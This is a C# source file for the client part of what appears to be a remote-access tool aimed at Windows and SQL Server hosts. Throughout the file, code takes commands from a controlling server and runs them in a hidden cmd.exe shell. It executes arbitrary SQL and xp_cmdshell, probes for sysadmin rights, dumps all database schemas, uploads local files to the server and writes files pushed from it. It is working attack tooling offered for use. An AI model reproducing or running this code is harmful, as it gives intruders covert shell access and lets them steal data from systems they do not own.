using System;
using System.Data;
using System.Data.SqlClient;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace MSATClient
{
    /// <summary>
    /// Socket连接
    /// </summary>
    /// <param name="tcpSocket"> socket连接</param>
    /// <param name="tcpStatus"> socket连接状态</param>
    /// <param name="sqlStatus"> 数据库连接状态</param>
    /// <param name="p"> cmd</param>
    /// <param name="sqlConnect"> 数据库连接</param>
    /// <param name="getServerMess"> 接收服务端数据进程</param>
    /// <param name="cmdSuccessful"> 传输cmd执行成功进程</param>
    /// <param name="cmdFail"> 传输cmd执行失败进程</param>
    /// <param name="data"> 定义传输数据包的大小</param>
    class MSATSocket
    {
        Socket tcpSocket = null;
        static Boolean sqlStatus = false;
        private Boolean tcpStatus = true;
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        SqlConnection sqlConnect = new SqlConnection();
        Thread getServerMess = null;
        Thread cmdSuccessful = null;
        Thread cmdFail = null;
        byte[] data = new byte[1024 * 1024 * 3];
        String filePath = "";

        /// <summary>
        /// 设置tcp socket的状态
        /// </summary>
        public void setTcpStatus(Boolean Status)
        {
            tcpStatus = Status;
        }

        /// <summary>
        /// Tcp连接socket
        /// </summary>
        /// <param name="serverIP"></param>
        public void TcpSocket(Socket tcp)
        {
            tcpSocket = tcp;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;    //是否使用操作系统shell启动
            p.StartInfo.RedirectStandardInput = true;//接受来自调用程序的输入信息
            p.StartInfo.RedirectStandardOutput = true;//由调用程序获取输出信息
            p.StartInfo.RedirectStandardError = true;//重定向标准错误输出
            p.StartInfo.CreateNoWindow = true;//不显示程序窗口
            p.Start();//启动程序
            p.StandardInput.WriteLine(" ");

            //接收数据线程
            getServerMess = new Thread(getMess);
            getServerMess.Start();

            //cmd命令正常线程
            cmdSuccessful = new Thread(cmdSuccessfulInfo);
            cmdSuccessful.Start();

            //cmd命令报错线程
            cmdFail = new Thread(cmdFailInfo);
            cmdFail.Start();

        }


        /// <summary>
        /// 接收服务端数据
        /// </summary>
        public void getMess()
        {
            String getmess = "";
            while (true)
            {
                GC.Collect();
                //socket断开连接，结束进程
                if (!tcpStatus)
                {
                    p.Kill();
                    p = null;
                    GC.Collect();
                    break;
                }
                try
                {
                    int length = tcpSocket.Receive(data);
                    getmess = Encoding.UTF8.GetString(data, 0, length);
                    int thisLenFlag = getmess.Length;
                    String allFlag = getmess.Substring(0, 12);
                    char firstFlag = allFlag[0];
                    int lenFlag = Convert.ToInt32(allFlag.Substring(1));
                    //Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + getmess);
                    String mess = Scale.UnicodeToString(getmess.Substring(12));
                    while (lenFlag > thisLenFlag)
                    {
                        length = tcpSocket.Receive(data);
                        getmess = Encoding.UTF8.GetString(data, 0, length);
                        thisLenFlag += getmess.Length;
                        if (firstFlag == '0' || firstFlag == '1' || firstFlag == '2' || firstFlag == '3' || firstFlag == '4')
                            mess += getmess;
                        else
                            mess += Scale.UnicodeToString(getmess);
                        /**if (mess.Length < 40)
                            Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess);
                        else
                            Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess.Substring(0, 35));**/
                    }
                    if (firstFlag == '0') //连接数据库
                    {
                        sqlConnect = SqlConnect(tcpSocket, sqlConnect, mess);
                    }
                    else if (firstFlag == '2')  //sql查询
                    {
                        try
                        {
                            SqlDataAdapter reader = new SqlDataAdapter(mess, sqlConnect);
                            DataSet dataSet = new DataSet();
                            reader.Fill(dataSet, "SQL");
                            mess = dataSet.GetXml();
                            String input = mess;
                            
                            string pattern = @"<[^/]*>.*</[^/]*>\r\n";
                            pattern = @"[ *\r\n]*\r\n[^<]*<[^<]*?>";
                            string replacement = "\r\n";
                            Regex rgx = new Regex(pattern);
                            string result = rgx.Replace(input, replacement);

                            pattern = @"</[^<]*>\r\n";
                            replacement = "_;&,";
                            rgx = new Regex(pattern);
                            result = rgx.Replace(result, replacement);

                            pattern = @"_;&,(?=\r\n[ ]*\r\n)";
                            replacement = "GabgMMgbaG_;&,";
                            rgx = new Regex(pattern);
                            result = rgx.Replace(result, replacement);

                            result = result.Substring(14);

                            //result = result.Replace("\r\n","");

                            //result = result.Replace("GabgMMgbaG_;&,", "_;&,\r\n");

                            foreach (DataTable dt in dataSet.Tables)
                            {
                                mess = "";
                                foreach (DataColumn dc in dt.Columns) //遍历所有的列
                                {
                                    mess = mess + dc.ColumnName + "_;&,";
                                }
                                mess += "GabgMMgbaG_;&,";
                            }
                            result = mess + "\r\n" + result;
                            SendMess(tcpSocket, result, "2");
                            dataSet = null; //销毁dataset的内存
                            reader = null;
                            pattern = null;
                            replacement = null;
                            input = null;
                            rgx = null;
                            result = null;
                            mess = null;
                            GC.Collect();
                        }
                        catch (Exception ex)
                        {
                            SendMess(tcpSocket, mess + "\r\n" + ex.Message, "a");
                        }
                        GC.Collect();
                    }
                    else if (firstFlag == '3') //执行xp_cmdshell
                    {
                        if (!sqlStatus)
                        {
                            SendMess(tcpSocket, "数据库未连接，请连接后再试！", "b");
                        }
                        else
                        {
                            try
                            {
                                SqlDataAdapter reader = new SqlDataAdapter("exec xp_cmdshell '" + mess + "'", sqlConnect);
                                DataSet dataSet = new DataSet();
                                reader.Fill(dataSet, "SQL");
                                mess = dataSet.GetXml();
                                SendMess(tcpSocket, mess, "3");
                                dataSet.Dispose(); //销毁dataset的内存
                                reader.Dispose();
                                mess = null;
                                reader = null;
                                dataSet = null;
                                GC.Collect();
                            }
                            catch (Exception ex)
                            {
                                SendMess(tcpSocket, ex.Message, "b");
                            }
                        }
                    }
                    else if (firstFlag == '4') //CMD命令
                    {
                        p.StandardInput.WriteLine(mess);
                        if (mess.Contains("cd "))
                            p.StandardInput.WriteLine(" ");
                        p.StandardInput.AutoFlush = true;
                    }
                    else if (firstFlag == '5') //客户端->服务端 传输文件
                    {
                        try
                        {
                            filePath = mess;
                            FileStream fsRead = new FileStream(mess, FileMode.Open);
                            long fileLength = fsRead.Length;
                            SendMess(tcpSocket, Path.GetFileName(mess) + "," + fileLength.ToString(), "5");
                            byte[] Filebuffer = new byte[1024 * 1024 * 3];//定义3MB的缓存空间（1024字节(b)=1千字节(kb)）
                            int readLength = 1024 * 1024 * 3;  //定义读取的长度
                            long sentFileLength = 0;//定义已发送的长度
                            while (readLength > 0 && sentFileLength < fileLength)
                            {
                                if ((fileLength - sentFileLength) < 1024 * 1024 * 3)
                                {
                                    readLength = (int)(fileLength - sentFileLength);
                                }
                                sentFileLength += readLength;//计算已读取文件大小
                                fsRead.Read(Filebuffer, 0, readLength);
                                tcpSocket.Send(Filebuffer, 0, readLength, SocketFlags.None);//继续发送剩下的数据包
                            }
                            fsRead.Close();//关闭文件流
                            fsRead = null;
                            mess = null;
                            Filebuffer = null;
                            GC.Collect();
                        }
                        catch (Exception ex)
                        {
                            SendMess(tcpSocket, ex.Message + filePath + "\r\n", "6");
                        }
                    }
                    else if (firstFlag == '6') //服务端->客户端 传输文件
                    {
                        String filename = "";//Path.GetFileName(ClientFilePathTextEdit.Text);
                        String[] clientInfo = mess.Split(',');
                        filename = clientInfo[0];
                        //filePath = filePath.Substring(0, filePath.Length-1);
                        long fileLength = Convert.ToInt64(clientInfo[1]);
                        byte[] Filebuffer = new byte[1024 * 1024 * 3];
                        int rec = 0;//定义获取接受数据的长度初始值
                        long recFileLength = 0;
                        String savePath = filename;
                        try
                        {
                            using (FileStream fs = new FileStream(filePath+savePath, FileMode.Create, FileAccess.Write))
                            {
                                while (recFileLength < fileLength)//判断读取文件长度是否小于总文件长度
                                {
                                    rec = tcpSocket.Receive(Filebuffer);//继续接收文件并存入缓存
                                    fs.Write(Filebuffer, 0, rec);//将缓存中的数据写入文件中
                                    fs.Flush();//清空缓存信息
                                    recFileLength += rec;//继续记录已获取的数据大小
                                }
                                fs.Close();
                                SendMess(tcpSocket, "\r\n" + filename + "上传成功！\r\n", "6");
                            }
                        }
                        catch (Exception ex)
                        {
                            while (recFileLength < fileLength)//判断读取文件长度是否小于总文件长度
                            {
                                rec = tcpSocket.Receive(Filebuffer);//继续接收文件并存入缓存
                                recFileLength += rec;//继续记录已获取的数据大小
                            }
                            SendMess(tcpSocket, ex.Message + "\r\n", "6");
                        }
                        filename = null;
                        clientInfo = null;
                        Filebuffer = null;
                        GC.Collect();
                    }
                    else if (firstFlag == 'e')
                    {
                        System.Environment.Exit(System.Environment.ExitCode);
                    }
                    mess = null;

                }
                catch (Exception ex)
                {
                    tcpStatus = false;
                    p.Kill();
                    p = null;
                    GC.Collect();
                    break;
                }
                GC.Collect();
            }
        }



        /// <summary>
        /// Cmd命令执行成功
        /// </summary>
        public void cmdSuccessfulInfo()
        {
            String result = "";
            while (tcpStatus)
            {
                //socket断开连接，结束进程
                if (!tcpStatus)
                {
                    break;
                }
                try
                {
                    result = p.StandardOutput.ReadLine();
                    MatchCollection mc = Regex.Matches(result, @"\A[a-zA-Z]:\\[^>]*");
                    foreach (Match m in mc)
                    {
                        filePath = m.ToString() + "\\";
                        break;
                    }
                    if (result != "" && result != "\n")
                        SendMess(tcpSocket, result + '\n', "4");
                }
                catch (Exception ex)
                {
                    GC.Collect();
                    break;
                }
            }
            //Console.WriteLine("CMD正常线程已关闭！！！");
        }

        /// <summary>
        /// Cmd命令执行失败
        /// </summary>
        public void cmdFailInfo()
        {
            String result = "";
            while (tcpStatus)
            {
                //socket断开连接，结束进程
                if (!tcpStatus)
                {
                    break;
                }
                try
                {
                    result = p.StandardError.ReadLine();
                    int len = result.Length;
                    if (len > 0)
                    {
                        if (result[0] == '\n' && len >= 2)
                        {
                            result = result.Substring(1, len - 2);
                        }
                    }
                    if (result != "" && result != "\n")
                        SendMess(tcpSocket, result + '\n', "4");
                }
                catch (Exception ex)
                {
                    GC.Collect();
                    break;
                }
            }
            //Console.WriteLine("CMD异常线程已关闭！！！");
        }

        /// <summary>
        /// 发送数据
        /// </summary>
        /// <param name="tcpClient"> tcp连接，由于传输cmd执行后的结果</param>
        /// <param name="mess"> 需要发送的数据</param>
        /// <param name="flag"> 数据的标识符</param>
        public static void SendMess(Socket tcpClient, String mess, String flag)
        {
            try
            {
                //返回的数据库信息，sql查询结果，xp_cmdshell执行结果，cmd执行结果不加密
                //if (flag != "1" && flag != "2" && flag != "3" && flag != "4")
                if (flag == "5" && flag == "6" && flag == "a" && flag == "b")
                        mess = "$GabgM" + Scale.StringToUnicode(mess);
                //因为cmd执行结果是按行读取，实时返回传输，会导致粘包问题，所以加上标识符，便于服务端识别
                //else if (flag == "4")
                else
                    mess = "$GabgM" + mess;
                byte[] sendmess = Encoding.UTF8.GetBytes(mess);
                mess = flag + getLength(mess.Length) + mess;
                sendmess = Encoding.UTF8.GetBytes(mess);
                tcpClient.Send(sendmess);
                sendmess = null;
                GC.Collect();
            }
            catch (Exception ex)
            {
                //Console.WriteLine("发送消息：TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
            }
        }

        /// <summary>
        /// 连接数据库
        /// </summary>
        /// <param name="tcpClient"> tcp连接，由于传输cmd执行后的结果</param>
        /// <param name="conn"> 数据库连接</param>
        /// <param name="mess"> 数据库用户名密码等</param>
        public static SqlConnection SqlConnect(Socket tcpClient, SqlConnection sql, String mess)
        {
            //判断数据库是否已连接
            if (sql.State == ConnectionState.Open)
            {
                sql.Close();
            }
            try
            {
                //Server:这边是填写数据库地址的地方。可以是IP，或者.\local\localhost\电脑名+实例名
                //Database:数据库的名称
                //uid:数据库用户名，一般为sa
                //pwd：数据库密码
                //conn = new SqlConnection("Server=.;Database=master;uid=sa;pwd=" + mess);
                sql = new SqlConnection(mess);
                sql.Open();
                if (sql.State == ConnectionState.Open)
                {
                    //Console.WriteLine("数据库已经打开");
                    sqlStatus = true;
                    //判断权限以及xp_cmdshell是否开启 
                    SqlDataAdapter reader = new SqlDataAdapter("select count(*) FROM sysobjects Where xtype = 'X' AND name = 'xp_cmdshell'", sql);
                    DataSet dataSet = new DataSet();
                    reader.Fill(dataSet);
                    if (dataSet.Tables[0].Rows[0]["Column1"].ToString() != "1")
                    {
                        mess = "2XP_CMDSHELL：未开启\r\n";
                    }
                    else
                    {
                        mess = "2XP_CMDSHELL：已开启\r\n";
                    }
                    reader = new SqlDataAdapter("select IS_SRVROLEMEMBER('sysadmin')", sql);//是否sa权限
                    dataSet = new DataSet();
                    reader.Fill(dataSet);
                    if (dataSet.Tables[0].Rows[0]["Column1"].ToString() == "1")
                    {
                        mess += "Permissions：sa(干翻对面)";
                    }
                    else
                    {
                        reader = new SqlDataAdapter("select IS_MEMBER('db_owner')", sql);//是否DB_OWNER权限
                        dataSet = new DataSet();
                        reader.Fill(dataSet);
                        if (dataSet.Tables[0].Rows[0]["Column1"].ToString() == "1")
                        {
                            mess += "Permissions：DB_OWNER";
                        }
                        else
                        {
                            mess += "Permissions：public(啥也不是)";
                        }
                    }
                    reader = new SqlDataAdapter("select @@version", sql);//是否sa权限
                    dataSet = new DataSet();
                    reader.Fill(dataSet);
                    SendMess(tcpClient, mess, "1");
                    SendMess(tcpClient, "3" + dataSet.Tables[0].Rows[0]["Column1"].ToString(), "1");
                    //查询数据库所有表名，字段名
                    try
                    {
                        SqlDataAdapter dbreader = new SqlDataAdapter("SELECT Name from Master..SysDatabases ORDER BY Name", sql);
                        DataSet dbDataSet = new DataSet();
                        dbreader.Fill(dbDataSet);
                        DataSet dataSet1 = new DataSet();
                        SqlDataAdapter tablesReader;
                        String sqlTableInfo = "";
                        foreach (DataRow row in dbDataSet.Tables[0].Rows)
                        {
                            sqlTableInfo += "SELECT '" + row[0].ToString() + "' as database_name,table_name,column_name FROM " + row[0].ToString() + ".[INFORMATION_SCHEMA].[COLUMNS] order by TABLE_NAME;";
                        }
                        tablesReader = new SqlDataAdapter(sqlTableInfo, sql);
                        tablesReader.Fill(dataSet1);
                        mess = dataSet1.GetXml();
                        SendMess(tcpClient, "4" + mess, "1");

                        dbreader = null;
                        dbDataSet = null;
                        dataSet1 = null;
                        tablesReader = null;
                    }
                    catch (Exception ex)
                    {
                        SendMess(tcpClient, "4数据库结构获取失败！", "1");
                    }
                    reader = null;
                    dataSet = null;
                    GC.Collect();
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("数据库连接失败! EX:" + ex.Message);
                SendMess(tcpClient, ex.Message, "a");
            }
            return sql;
        }


        /// <summary>
        /// 获取字符串长度，转化成11位字符串
        /// </summary>
        public static String getLength(int stringlength)
        {
            String strLength = "";
            stringlength += 12;
            strLength = Convert.ToString(stringlength);
            for (int i = strLength.Length; i < 11; i++)
            {
                strLength = "0" + strLength;
            }
            return strLength;
        }
    }
}
